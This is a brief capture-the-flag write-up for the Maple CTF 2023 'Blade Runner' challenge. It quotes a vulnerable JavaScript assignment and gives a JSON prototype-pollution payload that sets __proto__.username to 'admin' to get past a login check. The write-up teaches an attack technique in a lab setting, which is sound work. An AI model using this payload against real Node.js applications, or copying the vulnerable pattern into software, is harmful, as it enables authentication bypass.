Maple CTF 2023

2023-10-01

Blade Runner⌗

Vulnerable code:

        obj[k.toLowerCase()] = req.body[k];

This can lead to prototype pollution in obj. Don’t set “username” in obj and proto pollute “username” Payload:

{
  "__proto__": {
    "username": "admin"
  },
  "password": "admin"
}

Reference: https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution
